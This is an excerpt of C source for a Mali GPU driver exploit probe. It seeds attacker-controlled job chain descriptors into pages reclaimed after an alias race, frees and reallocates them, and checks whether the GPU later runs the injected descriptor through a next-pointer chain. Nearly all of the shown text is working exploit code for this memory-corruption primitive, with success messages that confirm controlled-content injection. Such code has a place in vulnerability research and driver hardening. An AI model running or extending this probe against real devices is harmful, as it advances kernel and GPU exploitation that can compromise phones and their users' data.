/*
 * mali_alias_chain_consumer_probe.c -- Test whether attacker-seeded data
 * written into reclaimed alias-race pages survives another alloc/free cycle and
 * can execute later as an indirect chain descriptor rather than a directly
 * resubmitted JC page.
 *
 * Safe model:
 ...
 *   8. Submit a separate local head descriptor whose next pointer references the
 *      preserved victim page.
 *
 * Positive result:
 *   The victim page preserves the attacker-seeded descriptor and the GPU follows
 *   a next-pointer chain into that page, proving controlled-content injection
 *   into a later GPU-consumed control surface without direct JC resubmission.
 *
 * Safety:
 *   - fork + alarm
...
static void build_wv_desc_with_next(uint32_t *jc_cpu, uint64_t target_gpu_va,
...
static int run_chain_consumer_attempt(int fd, int iter, struct attempt_result *result)
{
    ...
    uint64_t scratch_va = 0;
    uint64_t dest_va = 0;
    uint64_t control_jc_va = 0;
    uint8_t *native_cpu = MAP_FAILED;
    uint64_t *scratch_cpu = MAP_FAILED;
    uint64_t *dest_cpu = MAP_FAILED;
    uint32_t *control_jc_cpu = MAP_FAILED;
    ...
    dest_va = mali_alloc_flags(fd, 1, BASE_MEM_PROT_CPU_RD | BASE_MEM_PROT_CPU_WR |
                                   BASE_MEM_PROT_GPU_RD | BASE_MEM_PROT_GPU_WR |
                                   BASE_MEM_COHERENT_LOCAL);
    if (!scratch_va || !dest_va) {
        printf("[-] iter %d: scratch/dest alloc failed\n", iter);
        rc = -1;
        goto cleanup;
    }
    ...
    if (scratch_cpu == MAP_FAILED || dest_cpu == MAP_FAILED) {
        printf("[-] iter %d: scratch/dest mmap failed errno=%d\n", iter, errno);
        rc = -1;
        goto cleanup;
    }
    scratch_cpu[0] = SCRATCH64;
    ...
    result->victim_source_id = victim_source_id;
    victim_page_gpu_va = victim_slot.gpu_va + victim_page_index * PAGE_BYTES;
    ...
    if (scratch_cpu[0] != SCRATCH64 || dest_cpu[0] != DEST64) {
        printf("[-] iter %d: scratch/dest mutated before chain submit\n", iter);
        rc = -1;
        goto cleanup;
    }

    control_jc_va = mali_alloc_flags(fd, 1, BASE_MEM_PROT_CPU_RD | BASE_MEM_PROT_CPU_WR |
                                         BASE_MEM_PROT_GPU_RD | BASE_MEM_PROT_GPU_WR |
                                         BASE_MEM_COHERENT_LOCAL);
    if (!control_jc_va) {
        printf("[-] iter %d: control JC alloc failed\n", iter);
        rc = -1;
        goto cleanup;
    }
    control_jc_cpu = mali_cpu_map(fd, control_jc_va, PAGE_BYTES);
    if (control_jc_cpu == MAP_FAILED) {
        printf("[-] iter %d: control JC mmap failed errno=%d\n", iter, errno);
        rc = -1;
        goto cleanup;
    }

    build_wv_desc_with_next(control_jc_cpu, scratch_va, victim_page_gpu_va);
    __builtin___clear_cache((char *)control_jc_cpu, (char *)control_jc_cpu + PAGE_BYTES);
    __sync_synchronize();

    if (submit_jc(fd, control_jc_va, 0x40, &result->execute_event) < 0) {
        printf("[-] iter %d: chain-head submit failed\n", iter);
        rc = -1;
        goto cleanup;
    }

    printf("[*] iter %d: chain submit event=%s scratch=0x%016llx dest=0x%016llx victim_page=0x%llx\n",
           iter,
           event_name(result->execute_event),
           (unsigned long long)scratch_cpu[0],
           (unsigned long long)dest_cpu[0],
           (unsigned long long)victim_page_gpu_va);

    if (result->execute_event == BASE_JD_EVENT_DONE &&
        scratch_cpu[0] == 0 &&
        dest_cpu[0] == 0) {
        result->execute_hit = 1;
        printf("[!!!] INDIRECT CHAIN CONSUMER CONFIRMED\n");
        printf("      seeded source page %u survived reclaim free/realloc and executed as later chain descriptor at victim page %zu\n",
               seed_source_id, victim_page_index);
        rc = 1;
        goto cleanup;
    }

    printf("[*] iter %d: victim page preserved the seed but the later-chain consumer did not execute cleanly\n", iter);
    rc = 0;
...
cleanup:
    ...
    free_mapped_region(fd, &reclaim_slot);
    if (control_jc_cpu != MAP_FAILED)
        munmap(control_jc_cpu, PAGE_BYTES);
    if (dest_cpu != MAP_FAILED)
        munmap(dest_cpu, PAGE_BYTES);
    if (scratch_cpu != MAP_FAILED)
        munmap(scratch_cpu, PAGE_BYTES);
    if (control_jc_va)
        mali_free(fd, control_jc_va);
    if (dest_va)
...
static void run_probe(void)
{
    ...
    printf("=== mali_alias_chain_consumer_probe ===\n");
    printf("Seed a reclaimed alias-race page, free it, and test whether a later\n");
    printf("allocation preserves that descriptor well enough to execute as a later chain descriptor.\n\n");
    ...
    for (i = 1; i <= MAX_RACE_ITERS; i++) {
        ...
        int rc = run_chain_consumer_attempt(g_fd, i, &result);
        ...
        if (rc > 0) {
            printf("\n[+] Positive indirect-chain consumer signal on iter %d\n", i);
    ...
    printf("\n[*] No indirect-chain consumer signal in %d iterations\n", MAX_RACE_ITERS);
